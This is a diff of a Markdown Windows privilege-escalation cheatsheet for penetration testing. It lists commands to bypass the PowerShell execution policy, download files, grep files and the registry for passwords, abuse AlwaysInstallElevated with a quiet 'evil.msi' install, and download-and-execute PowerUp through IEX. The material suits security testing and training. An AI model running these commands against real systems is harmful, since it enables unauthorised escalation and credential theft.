@@ -1,13 +1,27 @@
 # Windows Privilege Escalation Cheatsheet
 
-## Information gathering
+## Powershell workarounds
 
-### Powershell informations
+### Powershell information
 
 ```powershell
 echo $Env:PSModulePath
 Get-ExecutionPolicy
 ```
+
+### Bypass powershell execution policy
+
+```powershell
+Set-ExecutionPolicy Bypass -Scope Process
+```
+
+### Download a file
+
+```powershell
+Invoke-WebRequest http://url-to/file -OutFile C:\path\to\file
+```
+
+## Information gathering
 
 ### Processes and owners
 
@@ -27,43 +41,24 @@ tasklist /v /fi "username eq system"
 Get-MpComputerStatus
 ```
 
-## Bypass powershell execution policy
-
-```powershell
-Set-ExecutionPolicy Bypass -Scope Process
-```
-
-## Download file
-
-```powershell
-Invoke-WebRequest http://url-to/file.ps1 -OutFile C:\path\to\file.ps1
-```
-
-## Search for passwords in filesystem
+### Search for passwords in filesystem
 
 ```powershell
 findstr /si password *.xml *.ini *.txt *.config
-```
-
-```powershell
 reg query HKLM /f password /t REG_SZ /s /k
-```
-
-```powershell
 reg query HKCU /f password /t REG_SZ /s /k
 ```
 
-## MSI register
+## Perform an escalation
+
+### MSI register
 
 ```powershell
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstalledElevated
-```
-
-```powershell
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstalledElevated
 ```
 
-If both return 1, then get an evil.msi and:
+#### If both return 1, then get an evil.msi and:
 
 ```powershell
 msiexec /quiet /qn /i evil.msi
@@ -71,8 +66,9 @@ msiexec /quiet /qn /i evil.msi
 
 ## Popular tools
 
-### Load PowerUp
+### PowerUp
 
 ```powershell
 powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks
 ```
+
